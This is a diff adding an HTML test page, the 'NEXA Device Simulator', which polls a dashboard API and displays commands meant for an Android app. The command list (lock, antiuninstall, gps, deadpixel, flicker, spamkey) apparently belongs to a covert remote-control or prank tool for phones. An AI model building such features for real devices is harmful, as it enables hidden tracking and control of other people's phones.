@@ -1,1 +1,108 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>NEXA Device Simulator</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: system-ui, sans-serif; background: #faf8f3; color: #1a1a1a; min-height: 100vh; padding: 16px; }
+    h1 { font-size: 1.2rem; margin-bottom: 12px; color: #c8a84b; }
+    .card { background: #fff; border: 1.5px solid rgba(200,168,75,0.35); border-radius: 14px; padding: 16px; margin-bottom: 12px; box-shadow: 0 4px 16px rgba(0,0,0,0.05); }
+    button { width: 100%; padding: 12px; border: 2px solid #1a1a1a; border-radius: 999px; background: #c8a84b; color: #1a1a1a; font-weight: 800; font-size: 14px; margin-top: 8px; }
+    button.stop { background: #e05; color: #fff; }
+    #log { font-family: monospace; font-size: 12px; background: #1a1a1a; color: #2ead9f; border-radius: 10px; padding: 12px; max-height: 280px; overflow-y: auto; white-space: pre-wrap; }
+    .online { color: #2ead9f; font-weight: 700; }
+    .cmd { color: #ff6b9d; font-weight: bold; }
+    #overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 50; align-items: center; justify-content: center; padding: 24px; }
+    #overlay.show { display: flex; }
+    #overlayMsg { background: #fff; border: 3px solid #c8a84b; border-radius: 16px; padding: 24px; max-width: 300px; text-align: center; font-size: 16px; font-weight: 700; }
+    #lines { display: none; position: fixed; inset: 0; pointer-events: none; z-index: 40; }
+    #lines.show { display: block; }
+    .hline { position: absolute; left: 0; right: 0; height: 3px; background: #2ead9f; box-shadow: 0 0 10px #2ead9f; }
+    .hline.pink { background: #ff2d95; box-shadow: 0 0 10px #ff2d95; }
+  </style>
+</head>
+<body>
+  <h1>NEXA Device Simulator</h1>
+  <div class="card">
+    <div>Test tanpa APK. Perintah dari dashboard muncul di sini.</div>
+    <div id="status" style="margin-top:8px">Status: Offline</div>
+    <button id="btnStart">Start Heartbeat</button>
+    <button id="btnStop" class="stop" style="display:none">Stop</button>
+  </div>
+  <div class="card">
+    <div style="font-weight:700;margin-bottom:8px">Command Log</div>
+    <div id="log">Menunggu...</div>
+  </div>
+  <div id="overlay"><div id="overlayMsg"></div></div>
+  <div id="lines"></div>
+  <script>
+    const deviceId = "test-device-" + Math.random().toString(36).slice(2, 8);
+    let timer = null, lineEnabled = false, lineColor = "green";
+    const logEl = document.getElementById("log");
+    const statusEl = document.getElementById("status");
+    const btnStart = document.getElementById("btnStart");
+    const btnStop = document.getElementById("btnStop");
+    const overlay = document.getElementById("overlay");
+    const overlayMsg = document.getElementById("overlayMsg");
+    const linesEl = document.getElementById("lines");
 
+    function log(msg, isCmd) {
+      const time = new Date().toLocaleTimeString();
+      logEl.innerHTML = `<span class="${isCmd ? "cmd" : ""}">[${time}] ${msg}</span>\n` + logEl.innerHTML;
+    }
+    function showMessage(text) {
+      overlayMsg.textContent = text || "Pesan dari Dashboard";
+      overlay.classList.add("show");
+      setTimeout(() => overlay.classList.remove("show"), 15000);
+    }
+    function updateLines() {
+      if (!lineEnabled) { linesEl.classList.remove("show"); linesEl.innerHTML = ""; return; }
+      linesEl.classList.add("show"); linesEl.innerHTML = "";
+      for (let i = 0; i < 8; i++) {
+        const d = document.createElement("div");
+        d.className = "hline" + (lineColor === "pink" ? " pink" : "");
+        d.style.top = (10 + i * 11) + "%";
+        linesEl.appendChild(d);
+      }
+    }
+    function handleCommands(cmds) {
+      if (!cmds || !cmds.length) return;
+      cmds.forEach(c => {
+        log("CMD: " + c.type + " " + JSON.stringify(c.payload || {}), true);
+        if (c.type === "message") showMessage(c.payload?.text);
+        if (c.type === "line") { lineEnabled = !!c.payload?.enabled; lineColor = c.payload?.color || "green"; updateLines(); }
+        if (["lock","flashlight","deadpixel","flicker","spamkey","antiuninstall","gps"].includes(c.type)) {
+          log("→ " + c.type.toUpperCase() + " " + (c.payload?.enabled ? "ON" : "OFF"));
+        }
+      });
+    }
+    async function heartbeat() {
+      try {
+        const res = await fetch("/api/devices", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ deviceId, name: "Simulator", model: "Android Test", battery: 80 + Math.floor(Math.random()*20), ip: "sim-" + deviceId.slice(-4) }),
+        });
+        const data = await res.json();
+        if (data.ok) {
+          statusEl.innerHTML = 'Status: <span class="online">Online</span> (' + deviceId + ')';
+          handleCommands(data.commands || []);
+        } else log("Gagal: " + (data.error || ""));
+      } catch (e) { log("Network: " + e.message); }
+    }
+    btnStart.onclick = () => {
+      if (timer) return;
+      btnStart.style.display = "none"; btnStop.style.display = "block";
+      log("Heartbeat started"); heartbeat();
+      timer = setInterval(heartbeat, 4000);
+    };
+    btnStop.onclick = () => {
+      if (timer) clearInterval(timer); timer = null;
+      btnStart.style.display = "block"; btnStop.style.display = "none";
+      statusEl.textContent = "Status: Offline"; log("Stopped");
+    };
+  </script>
+</body>
+</html>
